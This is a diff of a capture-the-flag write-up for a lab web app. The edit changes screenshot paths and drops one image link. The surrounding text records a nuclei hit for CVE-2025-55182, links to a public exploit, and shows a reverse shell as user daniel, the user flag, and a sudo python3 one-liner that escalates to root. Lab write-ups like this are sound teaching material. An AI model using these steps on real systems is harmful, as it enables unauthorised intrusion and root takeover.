@@ -46,8 +46,6 @@ Ran gobuster — nothing useful. Ran nuclei against the app — nothing on gobus
 [CVE-2025-55182] [http] [critical] http://10.114.187.208:3000
 ```
 
-![Nuclei scan](screenshots/corpweb_nuclei.png)
-
 Searched for the CVE and found a public exploit on GitHub:
 [CVE-2025-55182](https://github.com/Chocapikk/CVE-2025-55182)
 
@@ -67,7 +65,7 @@ Connection lands as `daniel`:
 uid=100(daniel) gid=101(secgroup) groups=101(secgroup),101(secgroup)
 ```
 
-![Reverse shell as daniel](screenshots/corpweb_reverseshell.png)
+![Reverse shell as daniel](../Screenshots/Love%20at%20First%20Breach%202026/corpweb_reverseshell.png)
 
 ---
 
@@ -78,7 +76,7 @@ cat /home/daniel/user.txt
 THM{R34c7_2_5h311_3xpl017}
 ```
 
-![User flag](screenshots/corpweb_userflag.png)
+![User flag](../Screenshots/Love%20at%20First%20Breach%202026/corpweb_userflag.png)
 
 ---
 
@@ -94,7 +92,7 @@ sudo python3 -c 'import os; os.system("/bin/ash")'
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
 ```
 
-![Privilege escalation to root](screenshots/corpweb_privesc.png)
+![Privilege escalation to root](../Screenshots/Love%20at%20First%20Breach%202026/corpweb_privesc.png)
 
 ---
 
